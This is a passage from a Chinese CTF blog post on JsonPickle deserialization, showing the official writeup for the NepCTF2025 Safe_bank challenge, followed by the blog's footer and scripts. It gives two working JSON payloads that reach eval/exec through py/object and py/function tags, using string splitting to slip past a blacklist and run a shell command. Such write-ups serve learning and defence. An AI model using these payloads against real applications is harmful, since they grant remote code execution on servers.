+<p><img src="../images/3392505-20250727214403401-720192041.png" alt="image" /></p>
+<h3 id="法二-官方wp"><a class="markdownIt-Anchor" href="#法二-官方wp"></a> 法二 官方wp</h3>
+<p>可以通过<code>builtin</code>或者<code>exceptions</code>来绕过<code>builtins</code>的限制</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">黑名单中没有限制eval或者exec，所以可以构造exceptions.eval或者exceptions.exec等相关语句来进行RCE，后面常见的字符串绕过就多种多样了。这里给出一个Payload<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__main__.Session&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span><span class="string">&quot;exceptions.eval&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargsex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/set&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;exec(&quot;</span>imp<span class="string">&quot;+&quot;</span>ort subpro<span class="string">&quot;+&quot;</span>cess;subpro<span class="string">&quot;+&quot;</span>cessgeto<span class="string">&quot;+&quot;</span>utput(&#x27;/r<span class="string">&quot;+&quot;</span>eadflag&gt;/app/static/flag&#x27;)<span class="string">&quot;)&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="string">&quot;&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span> <span class="punctuation">,</span> <span class="attr">&quot;ts&quot;</span><span class="punctuation">:</span> <span class="number">114514</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__builtin__.bytes&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__builtin__.map&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/function&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__builtin__.eval&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">[</span>f<span class="string">&quot;exec(&#x27;import os;os.system(&#x27;/readflag&gt;/app/flag5.txt&#x27;)&#x27;)&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JsonPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JsonPickle反序列化</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="JAVA反序列化-Shiro反序列化" class="lazyload">
+          
+        
+        <a href="/2025/10/08/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JAVA反序列化-Shiro反序列化
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="BaseCTF一道JAVA题-SCXMl" class="lazyload">
+        
+      
+      <a href="/2025/10/07/BaseCTF%E4%B8%80%E9%81%93JAVA%E9%A2%98-SCXMl/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          BaseCTF一道JAVA题-SCXMl
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonpickle"><span class="toc-number">1.</span> <span class="toc-text"> JsonPickle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 反序列化流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text"> 标签利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pytype"><span class="toc-number">3.1.</span> <span class="toc-text"> py&#x2F;type</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyfunction"><span class="toc-number">3.2.</span> <span class="toc-text"> py&#x2F;function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pymod"><span class="toc-number">3.3.</span> <span class="toc-text"> py&#x2F;mod</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.4.</span> <span class="toc-text"> 全局信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyrepr"><span class="toc-number">3.5.</span> <span class="toc-text"> py&#x2F;repr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyreduce"><span class="toc-number">3.6.</span> <span class="toc-text"> py&#x2F;reduce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyobject"><span class="toc-number">3.7.</span> <span class="toc-text"> py&#x2F;object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E5%88%A9%E7%94%A8payload"><span class="toc-number">3.8.</span> <span class="toc-text"> 可利用payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pynewargsex%E5%92%8Cpynewargs"><span class="toc-number">3.9.</span> <span class="toc-text"> py&#x2F;newargsex和py&#x2F;newargs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E5%A4%B1%E8%B4%A5"><span class="toc-number">4.</span> <span class="toc-text"> 编码绕过(失败)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text"> 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nepctf2025-safe_bank"><span class="toc-number">6.</span> <span class="toc-text"> NepCTF2025-Safe_bank</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8pynewargs"><span class="toc-number">6.1.</span> <span class="toc-text"> 为什么用py&#x2F;newargs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-la%E7%A5%9E%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95%E6%8A%B9%E9%99%A4%E5%A4%A7%E6%B3%95"><span class="toc-number">6.2.</span> <span class="toc-text"> 法一 la神的黑名单抹除大法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-%E5%AE%98%E6%96%B9wp"><span class="toc-number">6.3.</span> <span class="toc-text"> 法二 官方wp</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "JsonPickle反序列化",
+          url: "http://example.com/2025/10/07/JsonPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+          excerpt: "",
+          description: "",
+          stripContent: "这个知识点在强网杯S8决赛和NepCTF2025都考到了，今天来学一下 参考从源码看JsonPickle反序列化利用与绕WAF-先知社区  JsonPickle jsonpickle 是一个把任意 Python 对象图序列化为 JSON、并能从该 JSON 恢复出原始对象的库。 为了能“还原对象”，它在 JSON 中存储额外的元信息（例如 py/object, py/state 等），以记录对象的模块/类与状态，从而在反序列化时重新 import 并构造对象。由于它要恢复任意类的实例，反序列化过",
+          date: "Tue Oct 07 2025 17:36:50 GMT+0800",
+          updated: "Sat Apr 18 2026 16:57:57 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
